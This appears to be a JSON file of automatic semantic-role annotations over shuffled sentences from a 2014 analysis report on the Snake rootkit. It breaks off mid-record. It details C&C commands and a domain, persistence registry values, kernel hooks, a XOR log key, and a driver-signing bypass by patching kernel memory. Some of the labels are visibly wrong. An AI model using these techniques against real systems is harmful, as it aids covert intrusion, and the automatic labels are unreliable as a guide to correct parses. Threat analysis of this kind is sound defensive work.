"ARGM-ADV": {"text": "potentially"}, "V": {"text": "intercepted", "index": 43}, "ARG1": {"text": "keystrokes , and other output logs"}}}, "\n\nThe remote commands received by this Snake DLL module are designed to set up various communication parameters:\n<list>\n     \u2022\t    http_log\n     \u2022\t    http_no_pragma_cache\n     \u2022\t    http_no_accept\n     \u2022\t    proxy_useragent\n     \u2022\t    proxy_bypass\n     \u2022\t    proxy_server\n     \u2022\t    proxy_discover\n     \u2022\t    proxy_passwd\n     \u2022\t    proxy_user\n     \u2022\t    check_inet\n     \u2022     redir_str\n     \u2022     http_max_opt\n     \u2022     http_option\n     \u2022     http_uri\n     \u2022     no_server_hijack\n     \u2022     imp_level\n     \u2022     net_password\n     \u2022     net_user\n     \u2022     write_peer_nfo\n     \u2022     read_peer_nfo\n</list>\nTo post the data, the DLL can use the following User-Agent string \u201cMozilla/4.0 (compatible; MSIE 6.0)\u201d": {"received": {"ARG1": {"text": "The remote commands"}, "V": {"text": "received", "index": 3}, "ARG0": {"text": "by this Snake DLL module"}}, "are": {"V": {"text": "are", "index": 9}}, "designed": {"ARG1": {"text": "The remote commands received by this Snake DLL module"}, "V": {"text": "designed", "index": 10}, "ARG3": {"text": "to set up various communication parameters"}}, "set": {"ARG0": {"text": "The remote commands received by this Snake DLL module"}, "V": {"text": "set", "index": 12}, "ARG1": {"text": "various communication parameters"}}, "post": {"V": {"text": "post", "index": 19}, "ARG1": {"text": "the data"}, "ARG0": {"text": "the"}}, "can": {"V": {"text": "can", "index": 25}}, "use": {"R-ARG0": {"text": "To post the data"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "use", "index": 26}, "ARG1": {"text": "the following User - Agent string \u201c Mozilla/4.0 ( compatible"}}, "following": {"V": {"text": "following", "index": 28}, "ARG1": {"text": "User - Agent string"}}, "MSIE": {"V": {"text": "MSIE", "index": 38}, "ARG1": {"text": "6.0 ) \u201d"}}}, "\n\nOnce injected, the module initiates polling from one of the hard-coded C&C servers": {"injected": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "injected", "index": 1}, "ARG0": {"text": "the module"}}, "initiates": {"ARGM-TMP": {"text": "Once injected"}, "ARG0": {"text": "the module"}, "V": {"text": "initiates", "index": 5}, "ARG1": {"text": "polling"}, "ARG2": {"text": "from one of the hard - coded C&C servers"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 13}, "ARG1": {"text": "C&C servers"}}}, "\n\nThe first partition is created with the following steps:\n<list>\n    \u2022\t   the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling\n         IoCreateFile() API\n\n    \u2022\t   then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling\n         ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\n    \u2022\t   next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\n    \u2022\t   finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\n</list>\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is\nwritten to or read from the volume": {"is": {"V": {"text": "is", "index": 3}}, "created": {"ARG1": {"text": "The first partition"}, "V": {"text": "created", "index": 4}, "ARGM-MNR": {"text": "with the following steps"}}, "installed": {"ARG1": {"text": "The hook"}, "V": {"text": "installed", "index": 12}, "ARG2": {"text": "by the rootkit on IofCallDriver"}}, "provides": {"ARG0": {"text": "The hook installed by the rootkit on IofCallDriver ( ) API"}, "V": {"text": "provides", "index": 21}, "ARG1": {"text": "on - the - fly data encryption / decryption"}, "ARGM-TMP": {"text": "whenever that data is written to or read from the volume"}}, "is_2": {"V": {"text": "is", "index": 34}}, "written": {"ARGM-TMP": {"text": "whenever"}, "ARG1": {"text": "data"}, "V": {"text": "written", "index": 35}, "ARG2": {"text": "to"}}, "read": {"ARGM-TMP": {"text": "whenever"}, "R-ARGM-TMP": {"text": "that"}, "ARG1": {"text": "data"}, "V": {"text": "read", "index": 38}, "ARG2": {"text": "from the volume"}}}, "\n</list>\n\n\n\n<footer>                                                               BAE Systems Applied Intelligence: Snake Rootkit Report 2014   10</footer>\n\fThe command it receives is called UpLoad, so it uploads all the collected logs to the server, and then cleans out those logs:\n<list>\n    03:52:16 UpLoad: http upload 4 file(s)": {}, " It is also sophisticated, using complex techniques for evading host defences and\nproviding the attackers covert communication channels": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARGM-DIS": {"text": "also"}, "ARG2": {"text": "sophisticated"}, "ARGM-PRD": {"text": "using complex techniques for evading host defences and providing the attackers covert communication channels"}}, "using": {"V": {"text": "using", "index": 5}, "ARG1": {"text": "complex techniques for evading host defences"}}, "evading": {"V": {"text": "evading", "index": 9}, "ARG1": {"text": "host defences"}}, "providing": {"V": {"text": "providing", "index": 13}, "ARG1": {"text": "the/ covert communication channels"}}}, " The registration is ensured with creation of the following\nregistry entries:\n<list>\n    ErrorControl = 0\n    Group = \u201cStreams Drivers\u201d\n    ImagePath = %windows%\\$NtUninstallQ817473$\\fdisk.sys\n    Start = 1 [SYSTEM]\n    Type = 1\n\nin the newly created registry key\n\n    HKEY_LOCAL_MACHINE\\System\\CurrentControlSer\\Services\\Ultra3\n</list>\nThe driver then flags the following events with the notification purposes:\n<list>\n    \\BaseNamedObjects\\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}\n    \\BaseNamedObjects\\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\n</list>\nThe rootkit then places a number of the hooks": {"is": {"V": {"text": "is", "index": 2}}, "ensured": {"ARG1": {"text": "The registration"}, "V": {"text": "ensured", "index": 3}, "ARGM-MNR": {"text": "with creation of the following registry entries"}}, "following": {"V": {"text": "following", "index": 8}, "ARG1": {"text": "registry entries"}}, "places": {"ARG0": {"text": "The rootkit"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "places", "index": 15}, "ARG1": {"text": "a number of the hooks"}}}, "\nOne of the parameters defines the pipe name(s) that the DLL should use for its communications": {"defines": {"ARG0": {"text": "One of the parameters"}, "V": {"text": "defines", "index": 4}, "ARG1": {"text": "the pipe name(s )"}, "ARG2": {"text": "that the DLL should use for its communications"}}, "should": {"ARG0": {"text": "the DLL"}, "V": {"text": "should", "index": 12}, "ARG1": {"text": "use for its communications"}}, "use": {"ARG1": {"text": "the pipe name(s )"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "use", "index": 13}, "ARG2": {"text": "for its communications"}}}, "\n\n\nWhenever the client establishes connections, the TDI driver will also \u2018pulse\u2019 the \\BaseNamedObjects\\wininet_activate\nevent, just like the WPF driver\u2019s component of it, in order to notify the userland service about the event": {"establishes": {"ARGM-TMP": {"text": "Whenever"}, "ARG0": {"text": "the client"}, "V": {"text": "establishes", "index": 3}, "ARG1": {"text": "connections"}}, "will": {"ARGM-TMP": {"text": "Whenever the client establishes connections"}, "V": {"text": "will", "index": 9}}, "\u2018": {"ARGM-TMP": {"text": "Whenever the client establishes connections"}, "ARG0": {"text": "the TDI driver"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "\u2018", "index": 11}, "ARG1": {"text": "pulse \u2019 the \\BaseNamedObjects\\wininet_activate event , just like the WPF driver \u2019s component of it ,"}, "ARGM-PRP": {"text": "in order to notify the userland service about the event"}}, "pulse": {"ARGM-TMP": {"text": "Whenever the client establishes connections"}, "ARG0": {"text": "the TDI driver"}, "ARGM-MOD": {"text": "will"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "pulse", "index": 12}, "ARG2": {"text": "\u2019"}, "ARGM-PRP": {"text": "in order to notify the userland service about the event"}}, "notify": {"V": {"text": "notify", "index": 31}, "ARG2": {"text": "the userland service about the event"}}}, " By\nknowing what RPC services are running, it can successfully fingerprint all network hosts by mimicking the Metasploit\u2019s logic of OS\nfingerprinting via SMB": {"knowing": {"V": {"text": "knowing", "index": 1}, "ARG1": {"text": "what RPC services are running"}}, "are": {"V": {"text": "are", "index": 5}}, "running": {"ARG1": {"text": "what"}, "ARG0": {"text": "RPC services"}, "V": {"text": "running", "index": 6}}, "can": {"ARGM-MNR": {"text": "By knowing what RPC services are running/ by mimicking the Metasploit \u2019s logic of OS fingerprinting via SMB"}, "ARG0": {"text": "it"}, "V": {"text": "can", "index": 9}, "ARG1": {"text": "successfully fingerprint all network hosts"}}, "fingerprint": {"ARGM-MNR": {"text": "By knowing what RPC services are running/ successfully/ by mimicking/ via SMB"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "fingerprint", "index": 11}, "ARG1": {"text": "all network hosts"}}, "mimicking": {"ARG0": {"text": "it"}, "V": {"text": "mimicking", "index": 16}, "ARG1": {"text": "the Metasploit \u2019s logic of OS fingerprinting"}, "ARGM-MNR": {"text": "via SMB"}}, "fingerprinting": {"V": {"text": "fingerprinting", "index": 23}}}, " This file is then further encrypted with\nan NTL-based (Number Theory Library) algorithm and is uploaded by the usermode-centric Snake rootkit to the C&C server, along\nwith other configuration files, such as mtmon.sdb, mtmon32.sdb, gstatsnd.bin, gstat.bin, gstat32.bin, and other log\nfiles found in the %windows%\\$NtUninstallQ[random]$ directory": {"is": {"ARG1": {"text": "This file"}, "V": {"text": "is", "index": 2}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "further encrypted with an NTL - based ( Number Theory Library ) algorithm"}}, "encrypted": {"ARG1": {"text": "This file"}, "ARGM-TMP": {"text": "then"}, "ARGM-EXT": {"text": "further"}, "V": {"text": "encrypted", "index": 5}, "ARG2": {"text": "with an NTL - based ( Number Theory Library ) algorithm"}}, "based": {"ARG2": {"text": "NTL"}, "V": {"text": "based", "index": 10}, "ARG1": {"text": "( Number Theory Library ) algorithm"}}, "is_2": {"V": {"text": "is", "index": 18}}, "uploaded": {"ARG1": {"text": "This file"}, "V": {"text": "uploaded", "index": 19}, "ARG0": {"text": "by the usermode - centric Snake rootkit to the C&C server , gstatsnd.bin , gstat.bin , gstat32.bin , and other log files found in the % windows%\\$NtUninstallQ[random]$"}, "ARGM-COM": {"text": "along with other configuration files , such as mtmon.sdb , mtmon32.sdb"}}, "found": {"ARG1": {"text": "other log files"}, "V": {"text": "found", "index": 54}, "ARGM-LOC": {"text": "in the % windows%\\$NtUninstallQ[random]$ directory"}}}, " These tools can be used for covert\ncommunications in a number of different modes, some of which present significant challenges for\ntraditional security technologies to detect": {"can": {"V": {"text": "can", "index": 2}}, "be": {"V": {"text": "be", "index": 3}}, "used": {"ARG1": {"text": "These tools"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 4}, "ARG2": {"text": "for covert communications in a number of different modes , some of which present significant challenges for traditional security technologies to detect"}}, "detect": {"ARG0": {"text": "traditional security technologies"}, "V": {"text": "detect", "index": 26}}}, "\n\nThis driver is set up above a miniport driver (a driver that communicates with the physical device) and below a protocol driver (a\ndriver that implements a protocol, e.g": {"is": {"V": {"text": "is", "index": 2}}, "set": {"ARG1": {"text": "This driver/ ( a driver that communicates with the physical device ) and below a protocol driver ( a driver that implements a protocol , e.g"}, "V": {"text": "set", "index": 3}, "ARGM-ADV": {"text": "above a miniport driver"}}, "communicates": {"ARG0": {"text": "a driver"}, "R-ARG0": {"text": "that"}, "V": {"text": "communicates", "index": 13}, "ARG2": {"text": "with the physical device )"}}, "implements": {"ARG0": {"text": "a driver"}, "R-ARG0": {"text": "that"}, "V": {"text": "implements", "index": 28}, "ARG1": {"text": "a protocol , e.g"}}}, " The structures appear to contain headers to allow the pipe\nserver, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly": {"appear": {"ARG1": {"text": "The structures"}, "V": {"text": "appear", "index": 2}, "C-ARG1": {"text": "to contain headers to allow the pipe server , that runs within an infected userland module , to identify the messages first and then unwrap the structures accordingly"}}, "contain": {"ARG0": {"text": "The structures"}, "V": {"text": "contain", "index": 4}, "ARG1": {"text": "headers/ server , that runs within an infected userland"}, "ARGM-PRP": {"text": "to allow the pipe/ module , to identify the messages first and then unwrap the structures accordingly"}}, "allow": {"ARG0": {"text": "The structures"}, "V": {"text": "allow", "index": 7}, "ARG1": {"text": "the pipe server , that runs within an infected userland module"}}, "runs": {"ARG1": {"text": "the pipe server"}, "R-ARG1": {"text": "that"}, "V": {"text": "runs", "index": 13}, "ARGM-MNR": {"text": "within an infected userland module"}}, "identify": {"ARG0": {"text": "the pipe server"}, "R-ARG0": {"text": "that"}, "V": {"text": "identify", "index": 21}, "ARG1": {"text": "the messages"}, "ARGM-TMP": {"text": "first"}}, "unwrap": {"ARG0": {"text": "the pipe"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "unwrap", "index": 27}, "ARG1": {"text": "the structures"}, "ARGM-MNR": {"text": "accordingly"}}}, " The infected hosts are capable\nof transferring the following peer-2-peer commands defining fragment size, reliability parameters, new peer information, peer\nimpersonation flags, etc.:\n<list>\n    \u2022\t frag_size\n    \u2022\t frag_no_scrambling\n    \u2022\t peer_frag_size\n    \u2022\t read_peer_nfo\n    \u2022\t write_peer_nfo\n    \u2022\t imp_level\n    \u2022\t reliable_n_tries\n    \u2022\t reliable_keepalive\n    \u2022\t reliable_rtt\n    \u2022\t reliable_padding\n    \u2022\t reliable_no_keepalive\n    \u2022\t m2b_raw\n    \u2022\t psk\n    \u2022\t key\n</list>\nOnce the incoming data is authenticated and decrypted, the driver passes it to the DLL by using memory pipes": {"infected": {"V": {"text": "infected", "index": 1}, "ARG1": {"text": "hosts"}}, "are": {"ARG1": {"text": "The infected hosts"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "capable of transferring the following peer-2-peer commands defining fragment size , reliability parameters , new peer information , peer impersonation flags , etc"}}, "transferring": {"ARG0": {"text": "The infected hosts"}, "V": {"text": "transferring", "index": 6}, "ARG1": {"text": "the following peer-2-peer commands defining fragment size , reliability parameters , new peer information , peer impersonation flags , etc"}}, "following": {"V": {"text": "following", "index": 8}}, "defining": {"V": {"text": "defining", "index": 11}, "ARG1": {"text": "fragment size"}}, "is": {"ARG1": {"text": "the incoming data"}, "V": {"text": "is", "index": 33}, "ARG2": {"text": "authenticated and decrypted"}}, "authenticated": {"ARG1": {"text": "the incoming data"}, "V": {"text": "authenticated", "index": 34}}, "decrypted": {"ARG1": {"text": "the incoming data"}, "V": {"text": "decrypted", "index": 36}}, "passes": {"ARGM-TMP": {"text": "Once the incoming data is authenticated and decrypted"}, "ARG0": {"text": "the driver"}, "V": {"text": "passes", "index": 40}, "ARG1": {"text": "it"}, "ARG2": {"text": "to the DLL"}, "ARGM-MNR": {"text": "by using memory pipes"}}, "using": {"ARG0": {"text": "the driver"}, "V": {"text": "using", "index": 46}, "ARG1": {"text": "memory pipes"}}}, "\n\nConfiguration parameters along with the initial set of domain names are hard-coded within the body of the DLL": {"are": {"ARG1": {"text": "Configuration parameters along with the initial set of domain names"}, "V": {"text": "are", "index": 10}, "ARG2": {"text": "hard - coded within the body of the DLL"}}, "coded": {"ARGM-EXT": {"text": "hard"}, "V": {"text": "coded", "index": 13}, "ARGM-LOC": {"text": "within the body of the DLL"}}}, " Then it parses the function\u2019s code to locate the offset of the variable": {"parses": {"ARGM-TMP": {"text": "Then"}, "ARG0": {"text": "it"}, "V": {"text": "parses", "index": 2}, "ARG1": {"text": "the function \u2019s code"}, "ARGM-PRP": {"text": "to locate the offset of the variable"}}, "locate": {"V": {"text": "locate", "index": 8}, "ARG1": {"text": "the offset of the variable"}}}, "\nOne approach is to delegate the network communication engine to usermode code, backed up by a usermode rootkit": {"is": {"ARG1": {"text": "One approach"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "to delegate the network communication engine to usermode code , backed up by a usermode rootkit"}}, "delegate": {"V": {"text": "delegate", "index": 4}, "ARG1": {"text": "the network communication engine"}, "ARG2": {"text": "to usermode code"}, "ARGM-ADV": {"text": "backed up by a usermode rootkit"}}, "backed": {"V": {"text": "backed", "index": 13}, "ARG0": {"text": "by a usermode rootkit"}}}, "\n\nOnce located, the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded": {"located": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "located", "index": 1}}, "is": {"V": {"text": "is", "index": 9}}, "patched": {"ARGM-TMP": {"text": "Once located"}, "ARG1": {"text": "the content of the variable nt!g_CiEnabled"}, "V": {"text": "patched", "index": 10}, "ARGM-LOC": {"text": "in kernel memory"}}, "is_2": {"V": {"text": "is", "index": 19}}, "loaded": {"ARG2": {"text": "the 64-bit unsigned driver"}, "V": {"text": "loaded", "index": 20}}}, " In another model, the network communications are handled by a kernel mode driver - i.e": {"are": {"V": {"text": "are", "index": 7}}, "handled": {"ARGM-LOC": {"text": "In another model"}, "ARG1": {"text": "the network communications"}, "V": {"text": "handled", "index": 8}, "ARG0": {"text": "by a kernel mode driver - i.e"}}}, " As there are no validations made for the UserBuffer an\nattacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:\n<code>\n    01     /**\n    02       * Device I/O Control entry point": {"are": {"V": {"text": "are", "index": 2}, "ARG1": {"text": "no validations made for the UserBuffer"}}, "made": {"ARG1": {"text": "no validations"}, "V": {"text": "made", "index": 5}, "ARG3": {"text": "for the UserBuffer"}}, "can": {"V": {"text": "can", "index": 11}}, "craft": {"ARGM-ADV": {"text": "As there are no validations made for the UserBuffer"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "craft", "index": 12}, "ARG1": {"text": "such input parameters that will define address within kernel memory to patch and the data to patch it with"}}, "will": {"V": {"text": "will", "index": 17}}, "define": {"ARG0": {"text": "such input parameters"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "define", "index": 18}, "ARG1": {"text": "address within kernel memory to patch and the data to patch it with"}}, "patch": {"V": {"text": "patch", "index": 24}}, "patch_2": {"V": {"text": "patch", "index": 29}, "ARG1": {"text": "it"}, "ARG2": {"text": "with"}}}, " It\u2019s worth noting that Agent.BTZ used the same XOR key for its\nlogs as the most recent variants:\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nLog files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key": {"noting": {"V": {"text": "noting", "index": 3}, "ARG1": {"text": "that Agent . BTZ used the same XOR key for its logs as the most recent variants"}}, "used": {"ARG0": {"text": "Agent . BTZ"}, "V": {"text": "used", "index": 8}, "ARG1": {"text": "the same XOR key"}, "ARG2": {"text": "for its logs"}, "ARGM-TMP": {"text": "as the most recent variants"}}, "created": {"ARG1": {"text": "Log files"}, "V": {"text": "created", "index": 24}, "ARG0": {"text": "by the latest samples of Snake"}}, "compiled": {"V": {"text": "compiled", "index": 32}, "ARGM-MNR": {"text": "in 2013 and 2014"}}, "were": {"V": {"text": "were", "index": 38}}, "decrypted": {"ARG1": {"text": "Log files created by the latest samples of Snake , compiled in 2013 and 2014"}, "ARGM-MNR": {"text": "successfully/ with the same XOR key"}, "V": {"text": "decrypted", "index": 40}}}, "\n\nTo write data, it opens the device with CreateFile(\u201c\\\\.\\vstor32\u201d), then calls DeviceIoControl() API on its handle with\nIOCTL code of 0x222038": {"write": {"V": {"text": "write", "index": 1}, "ARG1": {"text": "data"}, "ARG0": {"text": "it"}}, "opens": {"R-ARG0": {"text": "To write data"}, "ARG0": {"text": "it"}, "V": {"text": "opens", "index": 5}, "ARG1": {"text": "the device"}, "ARG2": {"text": "with CreateFile(\u201c\\\\.\\vstor32 \u201d )"}}, "calls": {"ARG0": {"text": "it"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "calls", "index": 14}, "ARG2": {"text": "DeviceIoControl ( ) API on its handle with IOCTL code of 0x222038"}}}, "\n\nFor example, the message headers could be:\n<list>\n    \u2022\t domc.np\n    \u2022\t frag.np\n</list>\n\nOnce received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention -\nwhether it\u2019s a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes": {"could": {"V": {"text": "could", "index": 6}}, "be": {"ARGM-DIS": {"text": "For example"}, "ARG1": {"text": "the message headers"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "be", "index": 7}, "ARG2": {"text": "Once received from the pipes and unwrapped / decoded , the data is then handled by the usermode DLL as per the data intention - whether it \u2019s a traffic sniffing task , a peer-2-peer client logic , a logging task , or a task of saving received files into the virtual volumes"}}, "received": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "received", "index": 10}, "ARG2": {"text": "from the pipes and unwrapped / decoded"}}, "decoded": {"ARG1": {"text": "unwrapped"}, "V": {"text": "decoded", "index": 17}}, "is": {"V": {"text": "is", "index": 21}}, "handled": {"ARGM-TMP": {"text": "Once received from the pipes and unwrapped / decoded/ then"}, "ARG1": {"text": "the data"}, "V": {"text": "handled", "index": 23}, "ARG0": {"text": "by the usermode DLL"}, "ARG3": {"text": "as per the data intention - whether it \u2019s a traffic sniffing task , a peer-2-peer client logic , a logging task , or a"}, "ARG4": {"text": "task of saving received files into the virtual volumes"}}, "\u2019s": {"ARG0": {"text": "it"}, "V": {"text": "\u2019s", "index": 36}, "ARG1": {"text": "a traffic sniffing task , a peer-2-peer client logic , a logging task"}}, "sniffing": {"ARG0": {"text": "a traffic"}, "V": {"text": "sniffing", "index": 39}, "ARG1": {"text": "task"}}, "logging": {"V": {"text": "logging", "index": 48}, "ARG1": {"text": "task"}}, "saving": {"V": {"text": "saving", "index": 55}}, "received_2": {"ARG0": {"text": "a peer-2-peer client logic , a logging task , or a task of saving"}, "V": {"text": "received", "index": 56}, "ARG1": {"text": "files"}, "ARG4": {"text": "into the virtual volumes"}}}, "\n\nThe purpose of this behaviour is to blend Snake\u2019s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile\nat the same time": {"is": {"ARG1": {"text": "The purpose of this behaviour"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to blend Snake \u2019s traffic with the browser traffic , bypassing the firewalls , and keeping a low profile at the same time"}}, "blend": {"V": {"text": "blend", "index": 7}, "ARG1": {"text": "Snake \u2019s traffic"}, "ARG2": {"text": "with the browser traffic"}, "ARGM-ADV": {"text": "bypassing"}}, "bypassing": {"V": {"text": "bypassing", "index": 16}, "ARG1": {"text": "the firewalls"}}, "keeping": {"V": {"text": "keeping", "index": 21}, "ARG1": {"text": "a low profile"}, "ARGM-TMP": {"text": "at the same time"}}}, " Some variants of Snake carry the DLL modules that can be\ninstalled as a service, to be run within taskhost.exe or services.exe processes": {"carry": {"ARG0": {"text": "Some variants of Snake"}, "V": {"text": "carry", "index": 4}, "ARG1": {"text": "the DLL modules that can be installed as a service , to be run within taskhost.exe or services.exe processes"}}, "can": {"V": {"text": "can", "index": 9}}, "be": {"V": {"text": "be", "index": 10}}, "installed": {"ARG1": {"text": "the DLL modules"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "installed", "index": 11}, "ARG2": {"text": "as a service"}}, "be_2": {"V": {"text": "be", "index": 17}}, "run": {"ARG1": {"text": "the DLL modules"}, "V": {"text": "run", "index": 18}, "ARGM-LOC": {"text": "within taskhost.exe or services.exe processes"}}}, "\nThis device is used for userland/kernel communications": {"is": {"V": {"text": "is", "index": 2}}, "used": {"ARG1": {"text": "This device"}, "V": {"text": "used", "index": 3}, "ARG2": {"text": "for userland / kernel communications"}}}, "\n\nThe ZwReadFile() hook handler will block access to the home directory where the rootkit keeps its file": {"will": {"ARG0": {"text": "The ZwReadFile ( ) hook handler"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "block access to the home directory where the rootkit keeps its file"}}, "block": {"ARG0": {"text": "The ZwReadFile ( ) hook handler"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "block", "index": 7}, "ARG1": {"text": "access to the home directory where the rootkit keeps its file"}}, "keeps": {"ARGM-LOC": {"text": "the home directory"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the rootkit"}, "V": {"text": "keeps", "index": 16}, "ARG1": {"text": "its file"}}}, "\n\n\nThe data that the driver intercepts, along with the important notifications, is passed to the userland DLL to be processed": {"is": {"V": {"text": "is", "index": 13}}, "passed": {"ARG1": {"text": "The data that the driver intercepts , along with the important notifications ,"}, "V": {"text": "passed", "index": 14}, "ARG2": {"text": "to the userland DLL"}, "ARGM-PNC": {"text": "to be processed"}}, "be": {"V": {"text": "be", "index": 20}}, "processed": {"V": {"text": "processed", "index": 21}}}, " In order to switch into that mode, a dedicated thread is spawned to listen for IPC\nmessages received through the pipes": {"switch": {"V": {"text": "switch", "index": 3}, "ARG2": {"text": "into that mode"}}, "is": {"V": {"text": "is", "index": 11}}, "spawned": {"ARGM-PRP": {"text": "In order to switch into that mode/ to listen for IPC messages received through the pipes"}, "ARG1": {"text": "a dedicated thread"}, "V": {"text": "spawned", "index": 12}}, "listen": {"V": {"text": "listen", "index": 14}, "ARG1": {"text": "for IPC messages received through the pipes"}}, "received": {"ARG1": {"text": "IPC messages"}, "V": {"text": "received", "index": 18}, "ARGM-DIR": {"text": "through the pipes"}}}, "\n</list>\nAfter that, the malware connects to the new C&C, asking it for another command:\n<list>\n    03:52:13 1400: Connect marketplace.servehttp.com                              type(0)..": {"Connect": {"V": {"text": "Connect", "index": 3}, "ARG1": {"text": "marketplace.servehttp.com type(0 )"}}}, "\n\nIn the first model, the network communications are carried out from the userland - i.e": {"are": {"V": {"text": "are", "index": 8}}, "carried": {"ARGM-ADV": {"text": "In the first model"}, "ARG1": {"text": "the network communications"}, "V": {"text": "carried", "index": 9}, "ARGM-DIR": {"text": "from the userland - i.e"}}}, "\n\nTo delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:\n<list>\n    \u2022\t   DATA\n    \u2022\t   CREATE\n    \u2022\t   CMD\n    \u2022\t   POST\n    \u2022\t   GET\n    \u2022\t   DEL\n    \u2022\t   REGISTR\n    \u2022\t   COPY\n</list>\nThe usermode component of Snake communicates with its kernel-mode driver via a device called \\\\.\\vstor32 (created under\nkernel as \\Device\\vstor32)": {"delegate": {"V": {"text": "delegate", "index": 1}, "ARG1": {"text": "different types of tasks"}, "ARG0": {"text": "the clients"}}, "send": {"R-ARG0": {"text": "To delegate different types of tasks"}, "ARG0": {"text": "the clients"}, "V": {"text": "send", "index": 9}, "ARG1": {"text": "messages"}, "ARG2": {"text": "to the pipe server"}, "ARGM-MNR": {"text": "using the following task identification headers"}}, "using": {"V": {"text": "using", "index": 15}, "ARG1": {"text": "the following task identification headers"}}, "following": {"V": {"text": "following", "index": 17}, "ARG1": {"text": "task identification headers"}}, "called": {"ARG1": {"text": "a device"}, "V": {"text": "called", "index": 37}, "ARG2": {"text": "\\\\.\\vstor32 ( created"}}, "created": {"ARG1": {"text": "a device called \\\\.\\vstor32 ("}, "V": {"text": "created", "index": 40}, "ARG4": {"text": "under kernel"}}}, "\n\nFor example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the\ncommunications": {"are": {"V": {"text": "are", "index": 6}}, "used": {"ARG1": {"text": "the virtual partitions"}, "V": {"text": "used", "index": 7}, "ARG0": {"text": "by kernel - centric Snake variants , where the kernel - mode driver is responsible for the communications"}}, "is": {"ARGM-LOC": {"text": "kernel - centric Snake variants"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the kernel - mode driver"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "responsible for the communications"}}}, " To do that, the dropper first copies itself as:\n<list>\n     %windows%\\$NtUninstallQ817473$\\fdisk_mon.exe\n</list>\nThe dropper then registers itself as a service to ensure it starts every time Windows is booted, by creating the values:\n<list>\n     ErrorControl = 0\n     Type = 16\n     Start = 2\n     ImagePath = \u201d%SystemRoot%\\$NtUninstallQ817473$\\fdisk_mon.exe\n     ObjectName = \u201dLocalSystem\u201d\n     WOW64 = 1\n\nin the registry key:\n\n     HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Ultra3\n</list>\nNow comes the most interesting part: does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows\nVista and later versions, such as 64-bit Windows 7/8? The answer: Yes, it does": {"do": {"V": {"text": "do", "index": 1}, "ARG1": {"text": "that"}}, "comes": {"ARGM-DIS": {"text": "To do that"}, "ARGM-TMP": {"text": "Now"}, "V": {"text": "comes", "index": 12}, "ARG1": {"text": "the most interesting part"}}, "does": {"V": {"text": "does", "index": 18}}, "load": {"ARG0": {"text": "the dropper"}, "V": {"text": "load", "index": 23}, "ARG1": {"text": "its 64-bit unsigned driver"}, "ARG2": {"text": "under 64-bit versions of Windows Vista"}}, "does_2": {"V": {"text": "does", "index": 50}}}, " Once executed, the dropper\ninstalls the kernel mode driver in a pre-defined location": {"executed": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "executed", "index": 1}, "ARG1": {"text": "the dropper"}}, "installs": {"ARGM-TMP": {"text": "Once executed"}, "ARG0": {"text": "the dropper"}, "V": {"text": "installs", "index": 5}, "ARG1": {"text": "the kernel mode driver"}, "ARGM-LOC": {"text": "in a pre - defined location"}}, "defined": {"ARGM-MNR": {"text": "pre"}, "V": {"text": "defined", "index": 14}, "ARG1": {"text": "location"}}}, " As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the\ncompromised system": {"demonstrated": {"V": {"text": "demonstrated", "index": 1}}, "allow": {"ARGM-ADV": {"text": "As demonstrated"}, "ARG0": {"text": "the backdoor commands"}, "V": {"text": "allow", "index": 6}, "ARG1": {"text": "Snake to 